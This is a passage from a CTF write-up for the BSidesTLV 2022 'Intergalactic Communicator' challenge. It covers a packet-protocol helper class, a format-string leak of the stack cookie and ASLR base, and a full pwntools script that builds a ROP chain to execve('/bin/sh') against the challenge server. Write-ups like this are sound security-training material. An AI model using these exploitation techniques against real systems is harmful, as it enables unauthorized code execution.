</span><span class="code-line">    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">        self<span class="token punctuation">.</span>r <span class="token operator">=</span> r
</span><span class="code-line">
</span><span class="code-line">    <span class="token keyword">def</span> <span class="token function">send_packet</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">        checksum <span class="token operator">=</span> Comm<span class="token punctuation">.</span>crc64<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
</span><span class="code-line">        key <span class="token operator">=</span> p64<span class="token punctuation">(</span>checksum <span class="token operator">^</span> <span class="token number">0x2167616C46746F4E</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>checksum <span class="token operator">^</span> <span class="token number">0x2179654B7473754A</span><span class="token punctuation">)</span>
</span><span class="code-line">        rc4 <span class="token operator">=</span> ARC4<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
</span><span class="code-line">        data <span class="token operator">=</span> rc4<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
</span><span class="code-line">        totransmit <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> endian<span class="token operator">=</span><span class="token string">&quot;big&quot;</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>checksum<span class="token punctuation">)</span> <span class="token operator">+</span> data
</span><span class="code-line">        self<span class="token punctuation">.</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>totransmit<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">    <span class="token keyword">def</span> <span class="token function">recv_packet</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">        length <span class="token operator">=</span> u32<span class="token punctuation">(</span>self<span class="token punctuation">.</span>r<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">        data <span class="token operator">=</span> self<span class="token punctuation">.</span>r<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span>length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>
</span><span class="code-line">        <span class="token keyword">return</span> data
</span><span class="code-line">
</span><span class="code-line">    <span class="token keyword">def</span> <span class="token function">size</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">        self<span class="token punctuation">.</span>send_packet<span class="token punctuation">(</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">        <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>recv_packet<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">    <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> idx<span class="token punctuation">,</span> optional<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">        <span class="token keyword">if</span> <span class="token keyword">not</span> optional<span class="token punctuation">:</span>
</span><span class="code-line">            optional <span class="token operator">=</span> <span class="token string">b&quot;&quot;</span>
</span><span class="code-line">        self<span class="token punctuation">.</span>send_packet<span class="token punctuation">(</span>p32<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>idx<span class="token punctuation">)</span> <span class="token operator">+</span> optional<span class="token punctuation">)</span>
</span><span class="code-line">        <span class="token keyword">return</span> self<span class="token punctuation">.</span>recv_packet<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">    <span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">        self<span class="token punctuation">.</span>send_packet<span class="token punctuation">(</span>p32<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> data<span class="token punctuation">)</span>
</span><span class="code-line">        <span class="token keyword">return</span> self<span class="token punctuation">.</span>recv_packet<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">    <span class="token keyword">def</span> <span class="token function">clear</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">        self<span class="token punctuation">.</span>send_packet<span class="token punctuation">(</span>p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">        <span class="token keyword">return</span> self<span class="token punctuation">.</span>recv_packet<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">    <span class="token keyword">def</span> <span class="token function">broadcast</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">        self<span class="token punctuation">.</span>send_packet<span class="token punctuation">(</span>p32<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">        <span class="token keyword">return</span> self<span class="token punctuation">.</span>recv_packet<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>To use this class you have to give it a pwntools pipe as constructor argument
and then you can call the individual functions (Not that I only added
the optional packet data into the get method, but you could put that in
all the methods, I only needed it in the get function)</p>
<h2 id="part-2-pwn"><a href="#part-2-pwn" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Part 2: Pwn</h2>
<p>The year is 2022 AD, Strings are entirely ascii. Well not entirely! One small
part of memory still holds out against the ascii-fication.</p>
<p>Well, first of all we want to leak data, like the aslr base and the stack
cookie, as well as the stack address (We might not need it, but I mean, why not)</p>
<p>To do this we just add a string with the text <code>%529$p %533$p %532$p</code>, then
print that string using the get method. We get these numbers by taking the
size of the stack frame (0x1078), dividing that by eight and then adding six
(The first six arguments are in registers, and on the stack every argument
is eight bytes). That is the pointer to the saved return address, just before
that is the saved rbp, and for some reason 3 spaces further back is the stack
cookie.</p>
<p>Now with these values we can just rop, right? Well yes, but actually no,
but actually actually yes.</p>
<p>The author made all the strings ascii-only, so we would have had to wait
for the stack cookie and the aslr base to be ascii-only for an exploit,
which seemed unrealistic, so I scrapped that idea (Which was the intended
solution btw...), then I noticed that the decrypted buffer is copied from
the heap onto the stack (for some reason) before it&#x27;s being processed.
Which means we have all the binary values of the current packet on the stack,
or if we haven&#x27;t overwritten them the previous ones.</p>
<p>Which means instead of looking at the current stack frame we look a bit further
up in the stack frame of main and voilà, we find the values we are looking for,
luckily pwntools not only has the function <code>fmtstr_payload</code>, but also
<code>fmtstr_split</code>, which returns the format string and the binary data required.</p>
<p>So after leaking the values, we can continue to create a ropchain (pwntools
actually worked here, so just do a call to execve, don&#x27;t forget to set the base
stack address).
Next we somehow want the thing to jump to our payload, so we make a formatstring
payload which uses the binary data in the packet and overwrites the return address
with a ropgadget to increase the stack pointer (So it ends up in our buffer)</p>
<p>Next we just add the format, then get the string (which executes the vulnerability),
with optional data being set to the formatstring payload and the ropchain.</p>
<p>There are some magic values, but they&#x27;re not really that magic, the base
stack address is just calculated, since we have two returns and the gadget
increases the stack address by 0x78, we have a total of 0x88 bytes,
the 0x14fd22 is the offset to that gadget, the 553 is the offset into the
buffer in the stack frame of main (which can be calculated using the stack
frame sizes of all functions up to main and the return addresses, or by
guessing and adjusting)</p>
<p>The final payload has some space in between the format string data and
the ropchain, which i just filled with a bunch of 0s.</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line"><span class="token keyword">if</span> args<span class="token punctuation">.</span>LOCAL<span class="token punctuation">:</span>
</span><span class="code-line">    <span class="token keyword">if</span> args<span class="token punctuation">.</span>GDB<span class="token punctuation">:</span>
</span><span class="code-line">        r <span class="token operator">=</span> gdb<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&quot;./main&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>aslr<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token keyword">else</span><span class="token punctuation">:</span>
</span><span class="code-line">        r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&quot;./main&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token keyword">else</span><span class="token punctuation">:</span>
</span><span class="code-line">    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">&quot;intergalactic-communicator.ctf.bsidestlv.com&quot;</span><span class="token punctuation">,</span> <span class="token number">8080</span><span class="token punctuation">)</span>
</span><span class="code-line">comm <span class="token operator">=</span> Comm<span class="token punctuation">(</span>r<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">context<span class="token punctuation">.</span>binary <span class="token operator">=</span> exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">&quot;./main&quot;</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">comm<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token string">b&quot;%529$p %533$p %532$p&quot;</span><span class="token punctuation">)</span>
</span><span class="code-line">leaks <span class="token operator">=</span> comm<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
</span><span class="code-line">stack_cookie <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>leaks<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b&quot; &quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
</span><span class="code-line">exe<span class="token punctuation">.</span>address <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>leaks<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b&quot; &quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1C27E</span>
</span><span class="code-line">stack_address <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>leaks<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b&quot; &quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
</span><span class="code-line">info<span class="token punctuation">(</span><span class="token string">&quot;Stack cookie: 0x%x, ASLR base: 0x%x, Stack addr: 0x%x&quot;</span><span class="token punctuation">,</span> stack_cookie<span class="token punctuation">,</span> exe<span class="token punctuation">.</span>address<span class="token punctuation">,</span> stack_address<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>exe<span class="token punctuation">,</span>base<span class="token operator">=</span>stack_address<span class="token operator">+</span><span class="token number">0x88</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token comment">#rop.raw(rop.find_gadget([&quot;ret&quot;]).address)</span>
</span><span class="code-line">rop<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token string">&#x27;execve&#x27;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">b&#x27;/bin/sh&#x27;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">&quot;sh&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</span><span class="code-line">start_addr <span class="token operator">=</span> stack_address <span class="token operator">+</span> <span class="token number">8</span>
</span><span class="code-line">ropchain <span class="token operator">=</span> rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">comm<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line">fmt<span class="token punctuation">,</span>data <span class="token operator">=</span> fmtstr_split<span class="token punctuation">(</span><span class="token number">553</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
</span><span class="code-line">    start_addr<span class="token punctuation">:</span> exe<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x14fd22</span>
</span><span class="code-line"><span class="token punctuation">}</span><span class="token punctuation">,</span> numbwritten<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span>
</span><span class="code-line">comm<span class="token punctuation">.</span>add<span class="token punctuation">(</span>fmt<span class="token punctuation">)</span>
</span><span class="code-line">data <span class="token operator">=</span> data <span class="token operator">+</span> <span class="token string">b&quot;0&quot;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x50</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">comm<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> data<span class="token operator">+</span>ropchain<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b&quot;ls&quot;</span><span class="token punctuation">)</span>
</span><span class="code-line">r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span></code></pre></div>
<h2 id="links"><a href="#links" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Links</h2>
<ul>
<li>[<a target="_blank" rel="noopener noreferrer" href="https://sourcegraph.com/github.com/sourcegraph/lsif-demos/-/blob/c-cpp-redis/src/crc64.c?L9%5D(Redis">https://sourcegraph.com/github.com/sourcegraph/lsif-demos/-/blob/c-cpp-redis/src/crc64.c?L9](Redis</a> crc64)</li>
</ul>
<h2 id="healthcheck"><a href="#healthcheck" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Healthcheck</h2>
<p>Found this on the remote called <code>health_check.py</code></p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line"><span class="token keyword">import</span> socket
</span><span class="code-line"><span class="token keyword">import</span> sys
</span><span class="code-line"><span class="token keyword">import</span> re
</span><span class="code-line">
</span><span class="code-line">server <span class="token operator">=</span> <span class="token string">&#x27;localhost&#x27;</span>
</span><span class="code-line">port <span class="token operator">=</span> <span class="token number">8080</span>
</span><span class="code-line">check <span class="token operator">=</span> <span class="token string">b&#x27;\x00\x00\x00\x0c\xa9\xff\xaf\xc0\xbc\x1b\xacW5\xc9A\x11&#x27;</span>
</span><span class="code-line">leak <span class="token operator">=</span> <span class="token string">b&quot;\x00\x00\x00&gt;\\E\xc5h\x06\xc4\xd3c\xb4Ng\x04-\x10\xa1\x05fJ\xfb]\xbff*Ww46\xe1\xfb2\x80k\xd43\t)\xd7`\xc4\x91\xec\x9e\xef\xb2rC\x12J\xcb\x83\x1a2o\xfc\xb3\x0f\x190\xaf\x9a\xaf&#x27;&quot;</span>
</span><span class="code-line">read <span class="token operator">=</span> <span class="token string">b&#x27;\x00\x00\x00\x10\x88\x88\xde\x92+\x00:pu\x92\xe5\xb8\xd6\xd0w\xf7&#x27;</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">def</span> <span class="token function">send_exploit</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span> <span class="token builtin">buffer</span><span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> read_response<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> health<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">    <span class="token keyword">if</span> read_response<span class="token punctuation">:</span>
</span><span class="code-line">        size <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&#x27;little&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">        resp <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>size <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">        <span class="token keyword">if</span> health<span class="token punctuation">:</span>
</span><span class="code-line">            <span class="token keyword">if</span> <span class="token string">b&#x27;Welcome to the Intergalactic Communicator&#x27;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> resp<span class="token punctuation">:</span>
</span><span class="code-line">                sock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line">                sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
</span><span class="code-line">            <span class="token keyword">return</span> <span class="token boolean">True</span>
</span><span class="code-line">
</span><span class="code-line">        <span class="token keyword">if</span> <span class="token string">b&#x27;canary:&#x27;</span> <span class="token keyword">in</span> resp<span class="token punctuation">:</span>
</span><span class="code-line">            <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">rb&#x27;shellcode:([0-9A-Fa-fXx]*?):base:([0-9A-Fa-fXx]*?):canary:([0-9A-Fa-fXx]*?):&#x27;</span><span class="token punctuation">,</span> resp<span class="token punctuation">)</span>
</span><span class="code-line">            <span class="token keyword">return</span> <span class="token boolean">True</span>
</span><span class="code-line">
</span><span class="code-line">        <span class="token keyword">return</span> <span class="token boolean">False</span>
</span><span class="code-line">
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">def</span> <span class="token function">get_connection</span><span class="token punctuation">(</span>ip<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> port<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">:</span>
</span><span class="code-line">    sock <span class="token operator">=</span> <span class="token boolean">None</span>
</span><span class="code-line">    <span class="token keyword">while</span> sock <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
</span><span class="code-line">        <span class="token keyword">try</span><span class="token punctuation">:</span>
</span><span class="code-line">            sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>create_connection<span class="token punctuation">(</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">        <span class="token keyword">except</span> ConnectionRefusedError<span class="token punctuation">:</span>
</span><span class="code-line">            <span class="token keyword">continue</span>
</span><span class="code-line">    <span class="token keyword">return</span> sock
</span><span class="code-line">
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    conn <span class="token operator">=</span> get_connection<span class="token punctuation">(</span>server<span class="token punctuation">,</span> port<span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token keyword">try</span><span class="token punctuation">:</span>
</span><span class="code-line">        <span class="token comment"># Checking for welcome message</span>
</span><span class="code-line">        <span class="token keyword">if</span> <span class="token keyword">not</span> send_exploit<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> check<span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">            conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line">            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">        <span class="token comment"># Sending leak payload</span>
</span><span class="code-line">        send_exploit<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> leak<span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">        <span class="token comment"># Checking if leaked pointers</span>
</span><span class="code-line">        <span class="token keyword">if</span> <span class="token keyword">not</span> send_exploit<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> read<span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">            conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line">            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token keyword">except</span><span class="token punctuation">:</span>
</span><span class="code-line">        conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line">        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
</span><span class="code-line">    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line">    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#x27;__main__&#x27;</span><span class="token punctuation">:</span>
</span><span class="code-line">    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span></code></pre></div>
<h2 id="final-remarks"><a href="#final-remarks" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Final remarks</h2>
<p>The challenge was statically compiled and stripped, which is just an artificial
increase in difficulty, in the end there was nothing in this challenge which made
it worth the 500 points it was (in my opinion). But people couldn&#x27;t solve it
(probably also due to the reversing part), which makes the authors believe they
actually made a hard challenge.</p>
<p>This is not the case, this challenge was pretty easy once I had the packet sending
done, I just had to find a bunch of offsets and was done. Also the intended solution
for the pwn part was ridiculous, I don&#x27;t want to bruteforce 16000 to 20000 attempts
just to get ascii (and non-null) stack cookie &amp; aslr base, that is not fun to exploit
on a remote system where every connection takes way longer than locally.</p>
<p>TLDR: pwn too easy, rev cancer.</p></div><div class="pt-6 pb-6 text-sm text-gray-700 dark:text-gray-300"><a target="_blank" rel="nofollow" href="https://mobile.twitter.com/search?q=https%3A%2F%2Fsekai.team%2Fblog%2Fbsidestlv-2022%2Fintergalactic_communicator">Discuss on Twitter</a> • <a target="_blank" rel="noopener noreferrer" href="https://github.com/blueset/sekai.team/blob/master/data/blog/bsidestlv-2022/intergalactic_communicator.md">View on GitHub</a></div></div><footer><div class="text-sm font-medium leading-5 divide-gray-200 xl:divide-y dark:divide-gray-700 xl:col-start-1 xl:row-start-2"><div class="py-4 xl:py-8"><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Originally published on</h2><div class="flex flex-wrap text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a target="_blank" rel="noopener noreferrer" href="https://spclr.ch/bsidestlv2022-writeups">spclr.ch</a></div></div><div class="py-4 xl:py-8"><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Tags</h2><div class="flex flex-wrap"><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/bsidestlv-2022/">BSidesTLV-2022</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/pwn/">pwn</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/reverse/">reverse</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/rc4/">rc4</a></div></div><div class="flex justify-between py-4 xl:block xl:space-y-8 xl:py-8"><div><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Previous Article</h2><div class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a href="/blog/bsidestlv-2022/code_is_law/">BSidesTLV 2022 CTF – Code is Law</a></div></div><div><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Next Article</h2><div class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a href="/blog/bsidestlv-2022/sev/">BSidesTLV 2022 CTF – SEV</a></div></div></div></div><div class="pt-4 xl:pt-8"><a class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/blog/">← Back to the blog</a></div></footer></div></div></article></div></main><footer><div class="flex flex-col items-center mt-16"><div class="flex mb-3 space-x-4"><div class="flex mb-3 space-x-4"><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="mailto:project.sekai@sekai.team"><span class="sr-only"><span class="w-6">mail</span></span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M2.003 5.884 10 9.882l7.997-3.998A2 2 0 0 0 16 4H4a2 2 0 0 0-1.997 1.884z"></path><path d="m18 8.118-8 4-8-4V14a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8.118z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://github.com/project-sekai-ctf"><span class="sr-only"><span class="w-6">github</span></span><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://www.linkedin.com/company/project-sekai-ctf/"><span class="sr-only"><span class="w-6">linkedin</span></span><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 0 1-2.063-2.065 2.064 2.064 0 1 1 2.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://twitter.com/ProjectSEKAIctf"><span class="sr-only"><span class="w-6">twitter</span></span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M23.953 4.57a10 10 0 0 1-2.825.775 4.958 4.958 0 0 0 2.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 0 0-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 0 0-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 0 1-2.228-.616v.06a4.923 4.923 0 0 0 3.946 4.827 4.996 4.996 0 0 1-2.212.085 4.936 4.936 0 0 0 4.604 3.417 9.867 9.867 0 0 1-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 0 0 7.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0 0 24 4.59z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://ctftime.org/team/169557"><span class="sr-only"><span class="w-6">ctftime</span></span><svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" 